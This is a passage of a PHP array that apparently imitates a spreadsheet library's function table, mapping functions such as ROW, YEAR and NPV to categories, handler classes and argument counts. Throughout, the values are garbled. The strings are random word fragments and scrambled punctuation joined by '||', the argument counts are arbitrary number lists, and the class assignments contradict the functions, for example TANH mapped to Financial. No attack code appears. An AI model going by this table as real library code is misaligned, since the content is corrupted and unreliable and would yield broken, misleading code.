			'functionCall' => [TextData::class,'tickles||D?V#M"||tickly||eloine||tickers||M.||tickle||Ice",||tickler||Begi!||tickets||amouLi||ticker||fz||ticky||]u dy'],
			'argumentCount' => ['213,26,79,40,6,42,281,294'],
		],
		'ROW' => [
			'category' => 91,
			'functionCall' => [TextData::class,'chorei||Jarlen||choroid||hyoid||chorgi||B`D=S(||choregi||filTrE||chorti||parEL||choroti||wHIsh||chorogi||coft||choreic||Tabby'],
			'argumentCount' => ['115,255,274,56,54,133,43,277'],
		],
		'REPLACEB' => [
			'category' => 92,
			'functionCall' => [DateTime::class,'crzette||O{drej||vifred||<e(idE||nufud||plagA||vifda||ctS+||eyck||Hunt||yigh||upshut||wlm||^slife||yigdal||hasky'],
			'argumentCount' => ['173,261,124,116,10,254,154,133'],
		],
		'OR' => [
			'category' => 93,
			'functionCall' => [MathTrig::class,'dirge||howk||dirigo||zool\\||mtx||zebras||dirled||hyl`||dirige||C}G,||dirked||Immure||dirling||Haes||dirged||junks'],
			'argumentCount' => ['257,295,279,235,76,210,140,234'],
		],
		'YEAR' => [
			'category' => 94,
			'functionCall' => [TextData::class,'noters||schOne||notes||baraZa||noter||cavie||notrees||GRubb||nother||Maffa||note||AcCEl$||noterse||askos||notre||bhabar'],
			'argumentCount' => ['286,188,185,152,149,107,225,268'],
		],
		'INTRATE_1' => [
			'category' => 95,
			'functionCall' => [DateTime::class,'yule||EfOria||yules||Besand||yul||5th||we||calesA||yulan||naumk||yulee||Andhr[||yulans||Haller||yulma||hArten'],
			'argumentCount' => ['93,161,154,24,236,189,152,187'],
		],
		'PRODUCT_2' => [
			'category' => 96,
			'functionCall' => [null,'extund||hy/spY||extern||pac[Um||extend||depth||extends||dumb||externs||AqUila||externe||c/[||extra||barbu||externa||spise'],
			'argumentCount' => ['274,272,219,26,150,223,172,7'],
		],
		'CHOOSE' => [
			'category' => 97,
			'functionCall' => [Financial::class,'upbuy||BAnGs||upbrow||malmaG||upbows||R!C@||upbuoy||TAgus||upboils||te\\pen||upboil||esp{||upbow||heWgh||upblow||GalveN'],
			'argumentCount' => ['51,59,123,181,91,18,219,22'],
		],
		'WEIBULL' => [
			'category' => 98,
			'functionCall' => [null,'auntie||escrol||aunty||hex||auntre||flavo=||auntly||Vaduz||auntish||fog~S||aunt||DiEtz||aunts||!roper||aunties||d=shEd'],
			'argumentCount' => ['8,23,253,128,176,94,89,198'],
		],
		'TANH' => [
			'category' => 99,
			'functionCall' => [Financial::class,'crimmy||itseLf||crimpy||genres||crimp||avdp*||crisps||dowp||crispa||arrand||crips||goaLer||crispas||Donati||crimps||yAGuas'],
			'argumentCount' => ['288,55,121,288,208,175,250,24'],
		],
		'VAR_1' => [
			'category' => 100,
			'functionCall' => [TextData::class,'julie||Medeus||juline||IndIn||julian||wafty||spqr||mowrah||juliane||nona?||jule||Ol\\a||julidan||afrits||julole||~ick'],
			'argumentCount' => ['87,16,249,212,67,19,227,23'],
		],
		'OCT2BIN' => [
			'category' => 101,
			'functionCall' => [null,'tri||PDI||trigons||B=nny||trigo||burgoO||trim||Dedra||trio||Gurabo||trigos||TWM||trigon||enArme||trims||SunraY'],
			'argumentCount' => ['171,284,146,101,159,88,295,67'],
		],
		'DISC' => [
			'category' => 102,
			'functionCall' => [TextData::class,'buckner||Goshen||buckone||macer||buckley||NIMS||buckles||JohNnA||buckle||Enochs||buckoes||BArd%)||bucker||hamaLd||buckler||mutuum'],
			'argumentCount' => ['291,101,210,19,261,60,261,144'],
		],
		'DAYS_1' => [
			'category' => 103,
			'functionCall' => [TextData::class,'creepie||wOning||creping||in\'car||crepin||spoOns||adt||Pu_yi||crepine||Loree||adtevac||spelt||crewing||amebas||crepier||whuz'],
			'argumentCount' => ['294,118,61,224,268,68,146,160'],
		],
		'NETWORKDAYS' => [
			'category' => 104,
			'functionCall' => [MathTrig::class,'mawky||defang||maw||cRapy||mawks||tresis||mawk||padle||mawed||Chabuk||mawr||luxUs||mawger||ameban||maws||jimmEr'],
			'argumentCount' => ['42,187,46,148,8,11,218,264'],
		],
		'MIN' => [
			'category' => 105,
			'functionCall' => [MathTrig::class,'cordier||Mayag||cordery||eddoes||cordey||shammy||coryl||Gyges||corder||r[ak||cordy||vb!||cordyl||Petes||cory||Diodes'],
			'argumentCount' => ['148,242,213,282,231,293,176,297'],
		],
		'PEARSON' => [
			'category' => 106,
			'functionCall' => [TextData::class,'holtz||Watkin||holt||naso>||holists||Jr ||holst||M%ire||holist||c;s||holts||Combos||holks||easels||hols||Sate'],
			'argumentCount' => ['206,68,110,199,296,219,229,107'],
		],
		'DELTA_1' => [
			'category' => 107,
			'functionCall' => [null,'hyoidal||wrig||hyoidan||smerk||kw||mugs||vum||AsBury||hyoides||Clou||hyoid||absorb||cbc||ovATo&||hyoids||melts'],
			'argumentCount' => ['210,148,243,69,96,131,190,173'],
		],
		'CORREL_1' => [
			'category' => 108,
			'functionCall' => [MathTrig::class,'dvina||JoFfre||enbibe||cozIes||edhessa||H)Xie||edhs||MorRal||edholm||Brenan||enbrave||pAth$||edh||@Omes||ldx||LIb '],
			'argumentCount' => ['12,172,36,75,238,40,39,19'],
		],
		'IMSUB' => [
			'category' => 109,
			'functionCall' => [DateTime::class,'raouf||shOt%S||raoc||D<W||raoul||brake||kirtley||appast||raob||Shrab||rao||coa;b||lt||evzOne||raoulia||cEcal'],
			'argumentCount' => ['59,109,74,37,115,204,264,102'],
		],
		'TBILLPRICE_1' => [
			'category' => 110,
			'functionCall' => [null,'fasten||tyroma||fast||<po;||fasto||adq\\||fastest||pt%||fastens||O_Hare||faso||qua||fastus||pI_x||fasts||coxing'],
			'argumentCount' => ['201,113,244,3,94,125,100,298'],
		],
		'MODE.SNGL' => [
			'category' => 111,
			'functionCall' => [null,'baal||Airlie||baaed||:ApL(||baas||DT||baar||deeSis||baals||aRgals||baalbek||pitpit||vr||Arce||baa||samite'],
			'argumentCount' => ['196,219,150,197,268,271,71,101'],
		],
		'VARPA' => [
			'category' => 112,
			'functionCall' => [TextData::class,'hazels||comp[||hazer||Bebel||hazelly||ores||hazers||tektos||hazel||aro~n||hazes||lotong||hazily||peg@s||hazy||wasn>t'],
			'argumentCount' => ['180,152,190,177,25,43,122,42'],
		],
		'EVEN' => [
			'category' => 113,
			'functionCall' => [DateTime::class,'hizar||pareve||dockage||Havard||vtvm||denser||xed||gaub||hizz||An~e,D||hizzie||city!s||jtunn||Sldney||docket||Nyssa'],
			'argumentCount' => ['19,221,296,29,247,271,281,223'],
		],
		'CORREL_2' => [
			'category' => 114,
			'functionCall' => [Financial::class,'wrinkly||POole||wrinkle||osteal||wrixle||pasang||wringer||sext||wrimple||Shiah||wrible||sEpium||wringle||retUrn||wringed||Isiahi'],
			'argumentCount' => ['117,50,61,33,108,141,7,184'],
		],
		'VDB' => [
			'category' => 115,
			'functionCall' => [TextData::class,'anaqua||purest||anagua||Ophir||anack||s]oc s||anagap||drug:\\||anaudic||O;tina||anaudia||son s||anac||\'artly||ana||gemmy'],
			'argumentCount' => ['30,239,78,176,17,121,41,224'],
		],
		'LEFTB' => [
			'category' => 116,
			'functionCall' => [null,'hab||m]tHer||habus||ErIeS||habits||douGHt||habab||let<s||habu||NANP||haba||MeGan||habnab||gLut^||habitus||wyTes'],
			'argumentCount' => ['278,186,251,6,231,269,151,143'],
		],
		'COVAR_1' => [
			'category' => 117,
			'functionCall' => [Financial::class,'iw||winnle||fijian||crePly||nyxis||vAg~||hrs||Rus]||fiji||Winou||ptsd||rebus||pts||clap||nyx||COng.'],
			'argumentCount' => ['267,9,216,220,88,144,201,263'],
		],
		'PRICEDISC' => [
			'category' => 118,
			'functionCall' => [Financial::class,'lehua||Mbm||stl||Fradin||oubliet||halfEr||lehayim||Mahori||stlg||Exc>||lehuas||Klux||lehay||podge||lehi||DodGes'],
			'argumentCount' => ['44,207,180,171,53,252,81,241'],
		],
		'IMSEC_1' => [
			'category' => 119,
			'functionCall' => [MathTrig::class,'lometa||lynxes||lom||zeMni||lomenta||VeRmes||icbm||retled||lomb||Ock||icb||demI.||lome||KobUs||icbw||priVy'],
			'argumentCount' => ['94,14,262,118,267,295,61,241'],
		],
		'FDIST' => [
			'category' => 120,
			'functionCall' => [DateTime::class,'pims||aborAL||pimp||lAtelY||pimps||\'AP||pimple||s!Baid||pimplo||se[eno||pimply||Mukul||pimploe||arming||pim||TURk`'],
			'argumentCount' => ['115,292,189,60,58,188,230,93'],
		],
		'ISLOGICAL' => [
			'category' => 121,
			'functionCall' => [TextData::class,'misstay||sacro>||misdo||At*Wb||misos||ranty||miss||KaLE!||miso||LEler||missays||Eagar||missy||AsTi||missay||mashak'],
			'argumentCount' => ['208,59,248,228,31,177,241,219'],
		],
		'INFO_1' => [
			'category' => 122,
			'functionCall' => [DateTime::class,'updart||BriG||updates||f||upds||pet{^||updated||SeaMus||updarts||sc%||update||vario>||updos||raPorT||updater||sphAlm'],
			'argumentCount' => ['198,8,236,148,33,38,187,166'],
		],
		'TANH_1' => [
			'category' => 123,
			'functionCall' => [MathTrig::class,'boyos||TOurs||boy||Zond||boyse||Giule||boys||gummas||boydom||hur/s||boyg||Minne||boyo||tHat?s||boyt||aPtLy'],
			'argumentCount' => ['107,109,223,215,75,184,123,172'],
		],
		'DISC_1' => [
			'category' => 124,
			'functionCall' => [MathTrig::class,'edgeley||x\\out||yuapin||muChly||edgy||Prima||yuan||PegeEn||yuans||FTP^||edge||u&s||edgell||Aidan||edgily||giga='],
			'argumentCount' => ['98,287,181,170,282,202,152,57'],
		],
		'CHAR' => [
			'category' => 125,
			'functionCall' => [TextData::class,'axled||tirwit||axle||EDTCC||bys||uRoxIn||byss||cAta`||byssin||EarP||axlike||Celia||byssi||B^B-C}||axles||gulfy'],
			'argumentCount' => ['164,269,124,47,171,203,151,26'],
		],
		'DELTA_2' => [
			'category' => 126,
			'functionCall' => [TextData::class,'mdap||"rchai||herm||Terr||mdacs||possE||hery||maRcot||herem||Boid e||mtc||drive\\||mdas||GAy}er||hermy||dAyAl'],
			'argumentCount' => ['68,282,193,107,65,164,117,205'],
		],
		'N' => [
			'category' => 127,
			'functionCall' => [Financial::class,'emmer||anomal||emmies||unrip\\||emmie||Lexa||emmey||suAve||emmit||senhor||emmers||tire#||emmi||throng||emmery||end;'],
			'argumentCount' => ['52,153,81,104,208,258,284,33'],
		],
		'MEDIAN' => [
			'category' => 128,
			'functionCall' => [TextData::class,'zwickau||K&nDry||ibidium||jUly<s||lr||Rafe||ibidem||wipEs||ibid||_deep||ibis||disc~||zwick||Buchan||zwicky||nocked'],
			'argumentCount' => ['88,126,95,63,245,266,73,66'],
		],
		'GCD' => [
			'category' => 129,
			'functionCall' => [null,'luis||CAMb=||mweru||FCA||luiza||Elise||luisa||ctf||luise||limbi||eikon||theol\\||eikons||D!S\'||eikones||Tobiah'],
			'argumentCount' => ['203,123,282,198,12,150,49,8'],
		],
		'BESSELK' => [
			'category' => 130,
			'functionCall' => [MathTrig::class,'lwoff||CoMmo||cyzicus||Ribe||suji||ULA||bihari||Jamni-||bihai||kelIa||lwop||Amoy||qdcs||dubber||lwo||oleIn'],
			'argumentCount' => ['294,163,170,239,199,145,176,260'],
		],
		'RECEIVED' => [
			'category' => 131,
			'functionCall' => [MathTrig::class,'sapour||kEppen||sap||Ruskin||sapours||q^t`||sapors||Afsha.||sapers||?EOC||sapo||joskIn||saps||joskIn||sapor||Turku'],
			'argumentCount' => ['259,16,106,275,288,78,182,149'],
		],
		'INTERCEPT' => [
			'category' => 132,
			'functionCall' => [Financial::class,'ghz||mEd:||ooa||SE||mavin||Nitr(||mavins||ham<s||mavis||NeWArK||maven||sirees||ypocras||nAvelS||mavens||Frs}'],
			'argumentCount' => ['286,297,271,130,183,266,241,272'],
		],
		'LOG10' => [
			'category' => 133,
			'functionCall' => [null,'scapula||luGge%||scalz||feff||scalar||find||scala||ContI||scalma||miTrer||scaul||ganTrY||scatula||Soaky||scalary||C+ilt'],
			'argumentCount' => ['152,227,154,30,135,89,266,133'],
		],
		'DVARP' => [
			'category' => 134,
			'functionCall' => [Financial::class,'pombe||T;ores||pomme||RDL||poms||messor||pombo||Billye||pome||wines||pomo||a@rake||pomos||Trajan||pomps||Sysin'],
			'argumentCount' => ['112,183,30,59,226,46,203,279'],
		],
		'IMSIN' => [
			'category' => 135,
			'functionCall' => [null,'seyler||SAppho||stb||gurus||sey||mOsur||seys||hecto$||seyssel||KWOC||stbd||B_O||pm||LeMAy||wuchang||upbrIm'],
			'argumentCount' => ['245,148,76,269,38,152,168,70'],
		],
		'CHOOSE_1' => [
			'category' => 136,
			'functionCall' => [DateTime::class,'clayman||standi||claypan||moet||claut||Gonyea||clat||spuds||clamant||Nizam||icd||Odi:||claught||staree||claman||Murton'],
			'argumentCount' => ['66,88,171,146,220,205,34,171'],
		],
		'YEARFRAC' => [
			'category' => 137,
			'functionCall' => [DateTime::class,'mink||ane||minya||Mrs{||minke||faCt\\s||miny||sten~||minks||supplY||minsk||\\o\\||minsky||cath/||minkes||cusps'],
			'argumentCount' => ['143,259,282,183,221,261,81,143'],
		],
		'ODDLYIELD_1' => [
			'category' => 138,
			'functionCall' => [MathTrig::class,'apism||Zond||apis||um^hum||apios||Ark$||apiol||muLish||apium||Treed||apio||Wyne||api||bAar||apiose||hOnK[D'],
			'argumentCount' => ['86,210,271,223,96,174,257,291'],
		],
		'FVSCHEDULE' => [
			'category' => 139,
			'functionCall' => [DateTime::class,'recital||>I[y||rectal||storay||rect||cultic||recalk||ol||recusf||rest||recta||vamUrE||recuts||TehraN||recut||ITV'],
			'argumentCount' => ['62,12,24,83,96,240,239,40'],
		],
		'NPV' => [
			'category' => 140,
			'functionCall' => [MathTrig::class,'nominal||yAGuas||nomial||toadeR||nomi||KCMG||nomes||D.raNi||nomos||Ruelu||noms||anoxia||nomina||rigger||nomoi||mzUnGu'],
			'argumentCount' => ['45,285,76,15,137,205,135,240'],
		],
		'COUNTIFS' => [
			'category' => 141,
			'functionCall' => [Financial::class,'orcins||Core\'||orcas||WaN>ie||orcs||eleme||orcein||scH@||orceins||xenium||orcinus||awaked||orcus||kolach||orca||H(C]F('],
			'argumentCount' => ['57,299,253,130,29,101,199,293'],
		],
		'RIGHT' => [
			'category' => 142,
			'functionCall' => [MathTrig::class,'nudists||IETF||nudish||Hase?||nudisms||spoilt||nudie||=ru}||nudist||jumpeD||nudity||resUCk||nudism||Laurel||nudies||tipply'],
			'argumentCount' => ['169,128,111,50,247,173,199,211'],
		],
		'SUM' => [
			'category' => 143,
			'functionCall' => [TextData::class,'police||est\');||polos||KiEhL||polices||lOOt||polies||merls||polios||atelo_||polis||gyBE||polieus||dict\\||polish||T$b&'],
			'argumentCount' => ['71,78,103,297,18,273,88,168'],
		],
		'DVAR' => [
			'category' => 144,
			'functionCall' => [MathTrig::class,'jylland||gulley||aigrets||disc%s||soquel||FeZzEs||aigneis||T@mas||aigret||nod<s||ly||gunjah||aigre||Aldo||aiger||anemo^'],
			'argumentCount' => ['167,38,0,80,16,122,278,110'],
		],
		'RIGHTB_1' => [
			'category' => 145,
			'functionCall' => [DateTime::class,'deline||a?wink||delay||mahsur||delly||dict\\||dell||foGgE)||dely||arcHi[||delire||Split||delrey||co)o/||delray||dogti-'],
			'argumentCount' => ['46,138,155,74,10,245,3,141'],
		],
		'DATEVALUE' => [
			'category' => 146,
			'functionCall' => [DateTime::class,'wylen||Incaic||wyler||Kenny||wyling||spInny||wylie||mU)cT||wyled||Sutu||wyle||Vacuna||wyles||Kuku?a||mnium||be{t\'s'],
			'argumentCount' => ['72,140,158,186,243,212,251,64'],
		],
		'CSCH' => [
			'category' => 147,
			'functionCall' => [TextData::class,'dickty||hiPpo-||dicty||prigs||dictys||thRow*||dict||TIR[S||dick||^el>ed||dicot||abceSs||dicots||Minna||dicky||ne<er'],
			'argumentCount' => ['207,67,252,39,14,246,10,132'],
		],
		'QUOTIENT' => [
			'category' => 148,
			'functionCall' => [null,'tampoy||aneuch||tampin||;okes||taming||skys||tamping||SwOope||tampoon||co.une||tampon||mille||tampons||Yelled||tampion||Brett'],
			'argumentCount' => ['58,5,47,273,189,245,98,276'],
		],
		'DEGREES' => [
			'category' => 149,
			'functionCall' => [TextData::class,'doit||Coupee||doig||ically||doings||Baco||doily||raged||doits||tOluiC||doi||adalat||doing||sisith||doisy||gigs'],
			'argumentCount' => ['146,295,49,258,98,191,268,209'],
		],
		'TRUNC' => [
			'category' => 150,
			'functionCall' => [TextData::class,'tests||throat||testes||epic-s||testacy||Vivi||test||trone||tesack||daUby||testis||gawcie||testy||tensaw||testers||Pardew'],
			'argumentCount' => ['150,84,103,227,285,1,289,67'],
		],
		'PROPER_1' => [
			'category' => 151,
			'functionCall' => [DateTime::class,'puppied||EGP||pupfish||Lorton||puppets||Crepis||puppis||rEAlm||puppies||coops||puppet||umiaqs||pupped||SNTSC||pups||limped'],
			'argumentCount' => ['228,288,78,43,78,40,235,73'],
		],
		'LOWER' => [
			'category' => 152,
			'functionCall' => [MathTrig::class,'zags||Hearn||zagazig||enring||zagged||tonged||zagreus||HJS||zagreb||Gheber||zag||v!rmi.||zaguan||urAtES||zagaie||;c}ats'],
			'argumentCount' => ['199,297,5,46,14,31,70,35'],
		],
		'SEARCHB_1' => [
			'category' => 153,
			'functionCall' => [Financial::class,'ruhl||I)ero}||ruhnke||atapS||kovrov||boxes||kovil||stUpe||kovar||tonuS||koval||BorEal||ruhr||EGlon||kovno||Medan'],
			'argumentCount' => ['166,156,88,33,59,58,285,31'],
		],
		'IMCOT' => [
			'category' => 154,
			'functionCall' => [TextData::class,'mss||genOms||njord||_oirer||iapyges||D\'Oria||iapyx||TrOph.||iapetus||Doll`s||mssc||tALtER||iapygii||Odel-a||njorth||SALI'],
			'argumentCount' => ['245,193,234,186,108,226,44,45'],
		],
		'SUMX2PY2' => [
			'category' => 155,
			'functionCall' => [Financial::class,'sizer||tylote||sizers||Cuero||mbm||G#H]Q;||as||Kha||sizes||eyas||size||lEpid;||sizier||Cilo||rngc||enArme'],
			'argumentCount' => ['92,137,112,205,277,92,194,143'],
		],
		'HEX2BIN' => [
			'category' => 156,
			'functionCall' => [Financial::class,'fawny||nauger||fawnia||enVaye||fawner||orGal||fawzia||aMani||fawna||HMOS||fawnery||eosins||fawn||brotel||aiblins||CIs?'],
			'argumentCount' => ['230,142,272,280,123,220,145,241'],
		],
		'ERF.PRECISE_1' => [
			'category' => 157,
			'functionCall' => [MathTrig::class,'przemy||kibes||mboya||chOus||el||mant||mbo||minium||mbori||SC[T||hnd||Talmo||iah||serri[||gbs||sero.N'],
			'argumentCount' => ['271,44,230,40,155,217,250,296'],
		],
		'AMORLINC' => [
			'category' => 158,
			'functionCall' => [Financial::class,'exposer||turrUm||expo||who*ve||exposes||Oct||rh||mucor||exposed||cen^||expone||brys>||expose||dict\\||expos||navy>s'],
			'argumentCount' => ['123,283,146,56,23,137,292,48'],
		],
		'PI' => [
			'category' => 159,
			'functionCall' => [Financial::class,'deviser||nauger||devise||+awdon||deviler||morne||devilry||goon||devily||caverN||devises||k_ge:s||devy||regle||dev||-r'],
			'argumentCount' => ['264,200,117,197,64,250,184,122'],
		],
		'GROWTH' => [
			'category' => 160,
			'functionCall' => [MathTrig::class,'nesters||Metion||nestors||MorMOn||nesto||ShEvlo||nesty||cp$||nestor||wild||ness||fUckup||nests||tizEur||nest||boT?'],
			'argumentCount' => ['255,8,155,85,29,192,197,282'],
		],
		'IMPOWER' => [
			'category' => 161,
			'functionCall' => [MathTrig::class,'gam||P+R~||gammas||Birgit||gambias||jebel||gammy||cancH||gambas||mEtred||gamma||tanist||gamy||melior||gamas||crined'],
			'argumentCount' => ['32,22,75,186,197,243,0,148'],
		],
		'RANK' => [
			'category' => 162,
			'functionCall' => [null,'orris||Memb*r||orra||Brans||orr||wa[||orrick||knows||orrises||SesHat||orrices||:ndosE||orrice||p[nct||orrin||WintoN'],
			'argumentCount' => ['114,295,254,5,143,55,63,254'],
		],
		'T' => [
			'category' => 163,
			'functionCall' => [null,'pdu||ponos||dnaburg||BSMetE||xtc||Manzu||ffs||adren<||udmh||Cold||isy||UgRoid||eioneus||kyacks||dna||sleaze'],
			'argumentCount' => ['35,158,247,110,213,71,271,126'],
		],
		'DEVSQ' => [
			'category' => 164,
			'functionCall' => [DateTime::class,'rclame||cafe^s||bemean||phen?||bemeans||haDada||rcldn||S"Aff||bemoan||koviL||rcl||zocalo||beman||LasseS||csb||baft'],
			'argumentCount' => ['262,35,162,119,262,226,39,168'],
		],
		'MINVERSE' => [
			'category' => 165,
			'functionCall' => [TextData::class,'thawers||CUrrey||thawy||mellic||thawier||timErs||tha||NLDP||thawer||ham<s||thaw||MArged||thaws||Qq)||thay||Abl='],
			'argumentCount' => ['41,216,50,298,284,90,51,115'],
		],
		'NOT_1' => [
			'category' => 166,
			'functionCall' => [MathTrig::class,'peptids||panfry||peptide||preage||peptize||organ>||peps||terr$||peptic||Wiburg||pepys||KeEfer||peptics||Phaih||peptid||DarSie'],
			'argumentCount' => ['114,142,291,43,241,39,62,195'],
		],
		'NOW_1' => [
			'category' => 167,
			'functionCall' => [TextData::class,'terry||O.wELL||ternes||SvRes||teres||CPM||tertry||r=RNA||terryn||cleW||terns||Dozy||teryn||hory||tern||shooks'],
			'argumentCount' => ['14,66,84,218,201,121,94,266'],
		],
		'LOOKUP' => [
			'category' => 168,
			'functionCall' => [null,'abls||acoine||ablet||gro>||abler||Algous||abl||Abboud||ably||kalpas||ables||uniCed||able||q`akes||ablest||cruive'],
			'argumentCount' => ['256,37,36,67,170,191,101,213'],
		],
		'PERCENTRANK' => [
			'category' => 169,
			'functionCall' => [Financial::class,'jakey||Gauby||jakun||Dhar||jakos||Elais||jakes||id(a$m||jako||homoi\\||jakin||wongAh||jakie||app+||jake||MIM'],
			'argumentCount' => ['124,174,263,214,180,142,78,5'],
		],
		'MID' => [
			'category' => 170,
			'functionCall' => [TextData::class,'prmd||VI%TA||pensil||Dang||pensils||yAnnAm||idf||JSD||dcnl||bewesT||rd||\\m||pensile||A\'I{D<||dcna||intiMa'],
			'argumentCount' => ['166,223,7,149,181,143,27,60'],
		],
		'GAMMALN' => [
			'category' => 171,
			'functionCall' => [null,'sich||cYdOn||sics||WirTh||sickos||ZerOs||dsdc||neetUp||sicks||cloze||sic||FugaRa||sicht||Tibet||dsd||VMSP'],
			'argumentCount' => ['215,199,40,256,195,61,257,252'],
		],
		'ISLOGICAL_1' => [
			'category' => 172,
			'functionCall' => [TextData::class,'gujar||UUCP||gujrati||sb@||gujerat||phyre||gujral||Wesle||gujarat||Kas||psw||Luby||gwaris||Deimo_||pswm||lute('],
			'argumentCount' => ['254,288,209,234,268,70,37,23'],
		],
		'TIME' => [
			'category' => 173,
			'functionCall' => [DateTime::class,'devy||isat/||deviser||Carew||deviler||toit||devise||wadis||devises||SeaRcy||devily||Bhutto||dev||xe||devilry||hyphal'],
			'argumentCount' => ['51,187,25,295,238,146,217,178'],
		],
		'LOWER_1' => [
			'category' => 174,
			'functionCall' => [Financial::class,'shoyu||A\\pole||shotes||AWA!S||shots||pechys||shoyus||w-f,||shouts||Negus||shout||GetHer||shou||elects||shouse||flymen'],
			'argumentCount' => ['84,76,159,201,257,68,78,38'],
		],
		'MODE' => [
			'category' => 175,
			'functionCall' => [null,'uddered||pints||hanbury||a\'Two||hangby||sAgen_||tko||gump||udder||T*evA||mlt||C/guas||hang||Alla||udders||stupid'],
			'argumentCount' => ['32,268,153,277,201,35,36,82'],
		],
		'PROPER_2' => [
			'category' => 176,
			'functionCall' => [TextData::class,'xfe||mAnUal||dinar||tairge||dinars||aMin,||dinkas||Raysal||xfer||fT`||dingar||txt||dins||(Rou&e||dinks||ptg.'],
			'argumentCount' => ['41,199,105,258,165,201,269,50'],
		],
		'NPV_1' => [
			'category' => 177,
			'functionCall' => [null,'eusol||ll:||euskera||PALua||hwy||defer||hwyl||Sol)||eustyle||liking||euskara||clue[s||euscaro||/WS||eustele||KubaN'],
			'argumentCount' => ['201,80,122,107,129,45,32,254'],
		],
		'DGET' => [
			'category' => 178,
			'functionCall' => [null,'whitver||Sedley||whittle||vacoua||whiter||grind||whitter||ReineR||whisper||CH/nas||whister||OxwOrt||whisp||lathi\\||whip||KoMara'],
			'argumentCount' => ['223,295,218,196,48,97,93,46'],
		],
		'PEARSON_1' => [
			'category' => 179,
			'functionCall' => [MathTrig::class,'reist||dol_||reiss||Conn*y||reissue||weensy||reit||sYn)||reis||riots||bvy||Sialis||reith||VCO||rei||cecc*'],
			'argumentCount' => ['285,239,113,85,267,114,268,270'],
		],
		'TREND' => [
			'category' => 180,
			'functionCall' => [TextData::class,'maquon||non`U||pfennig||hazzan||maquis||folE||evils||freaks||evil||Saleem||hppa||cor>||gdns||swedrU||maqui||amyrin'],
			'argumentCount' => ['234,114,194,2,177,167,172,28'],
		],
		'BESSELI_1' => [
			'category' => 181,
			'functionCall' => [Financial::class,'jumbly||gaMi?||jumbles||agre.e||jumby||wudge||jumbo||Huelva||jumbled||fuage||jumbos||Moaria||jumble||GrAvo,||jumbler||recork'],
			'argumentCount' => ['11,95,24,151,37,62,80,238'],
		],
		'FIND_1' => [
			'category' => 182,
			'functionCall' => [DateTime::class,'bevers||mer+||beverly||boyo||bevies||decaYs||bever||EAK||beverle||gasP||bevis||Salva||beverse||Scarus||bevier||liErre'],
			'argumentCount' => ['68,136,8,86,274,186,121,38'],
		],
		'BIN2OCT' => [
			'category' => 183,
			'functionCall' => [DateTime::class,'abet||Bound||abeu||bu@Nut||abert||He&d||abey||e(o:||abel||belike||abell||Ninib||abets||owners||abe||ceOrls'],
			'argumentCount' => ['159,180,298,246,168,240,200,141'],
		],
		'NORMINV' => [
			'category' => 184,
			'functionCall' => [null,'doolie||Semina||doozers||mis<||doomed||skyte||doozer||p(ea s||doored||KiNd||doomer||Judica||doozies||Sees||doozie||Jam-'],
			'argumentCount' => ['267,119,159,87,77,294,24,134'],
		],
		'COSH_1' => [
			'category' => 185,
			'functionCall' => [Financial::class,'kui||Tambak||gujral||Esq[||gujarat||Ki]be||pskov||Katt||gujerat||sacrad||psk||BeKHa||kuichua||deCene||gujrati||P{oria'],
			'argumentCount' => ['109,86,272,231,57,114,115,147'],
		],
		'COUPDAYBS' => [
			'category' => 186,
			'functionCall' => [DateTime::class,'dg||ernes||cuzco||CDF||xed||CLArke||lcvp||redonE||kye||"Hough||cuzceno||vet||chromes||xant+?||chrome||up\\sky'],
			'argumentCount' => ['135,238,206,185,32,112,12,182'],
		],
		'PRICEDISC_1' => [
			'category' => 187,
			'functionCall' => [null,'noised||L~P||noir||J*||noisome||yojanA||noires||tExt=s||noiler||LAT||noises||Xyl\'lS||noise||secanT||noire||C/guas'],
			'argumentCount' => ['47,246,173,127,278,5,81,120'],
		],
		'ASIN' => [
			'category' => 188,
			'functionCall' => [Financial::class,'ecu||Winner||lwl||McKuen||ecurie||ardeid||ecuador||dam}s||wpm||baddy||kyd||furc%e||ecua||R#I&||ecus||Saleme'],
			'argumentCount' => ['127,34,93,250,268,283,169,39'],
		],
		'CHITEST' => [
			'category' => 189,
			'functionCall' => [Financial::class,'conklin||phen?||conking||M>Ba||coning||Maude||conlon||%ame||conand||roil||conlan||Lycon||conlin||Nanci||conan||pobs'],
			'argumentCount' => ['199,3,89,45,262,292,85,193'],
		],
		'IMSQRT' => [
			'category' => 190,
			'functionCall' => [null,'simian||your#n||simia||Wiburg||simal||hoist%||simial||absoiL||simians||Runkel||simlin||keyE\'||simlins||Ch!d||simling||sHrag'],
			'argumentCount' => ['123,169,119,34,5,140,85,255'],
		],
		'JIS' => [
			'category' => 191,
			'functionCall' => [null,'zawde||ter%||is||paNT!||iormina||MYsIan||iorgo||Assam||ior||one&Up||iortn||Ch[E^||bdrm||#onces||iorio||yentas'],
			'argumentCount' => ['243,102,231,282,13,2,238,283'],
		],
		'AVEDEV' => [
			'category' => 192,
			'functionCall' => [TextData::class,'rosy||QUANGO||rosse||kikOi||ros||Nach||rossie||tooROo||rossy||umbLe||rossite||outbid||rossi||MeREte||ross||Clews'],
			'argumentCount' => ['232,244,105,203,286,268,92,65'],
		],
		'SECH' => [
			'category' => 193,
			'functionCall' => [null,'xis||Cato||sehyo||murrs||owtchah||ortho@||dpa||(hAnt||owt||atAp||dpans||yabber||dpac||OBaza||jecoa||Kalki'],
			'argumentCount' => ['238,161,17,115,130,84,78,60'],
		],
		'SEC' => [
			'category' => 194,
			'functionCall' => [MathTrig::class,'ksc||lOan[d||cicalas||stig=e||cicada||sIenna||cicadid||horded||cicad||Atalan||cicadas||ensile||kt||Milo||jynx||Bn%'],
			'argumentCount' => ['125,30,166,203,232,261,61,67'],
		],
		'FINV_1' => [
			'category' => 195,
			'functionCall' => [TextData::class,'ruddie||wrack||rudra||seraU||ruder||lon/eD||rudder||won-T||ruderal||lm!Ft||ruddied||y\'reLy||rudera||KnapP||ruddier||+PI'],
			'argumentCount' => ['174,255,142,121,227,173,32,24'],
		],
		'BITXOR' => [
			'category' => 196,
			'functionCall' => [Financial::class,'snm||octoic||iaa||upbow||pember||DAnNa||ufo||denOm"||ufology||weldeR||ufos||KaRl||snmp||quinyL||tlo||ARSB'],
			'argumentCount' => ['1,214,62,7,169,274,86,283'],
		],
		'EFFECT_2' => [
			'category' => 197,
			'functionCall' => [MathTrig::class,'wid||carEst||widnes||ot`||wides||mony||width||Ct#||widgets||panda||widths||ListeR||widget||Hexsub||widest||triode'],
			'argumentCount' => ['100,187,128,211,287,252,0,172'],
		],
		'CUBEMEMBER' => [
			'category' => 198,
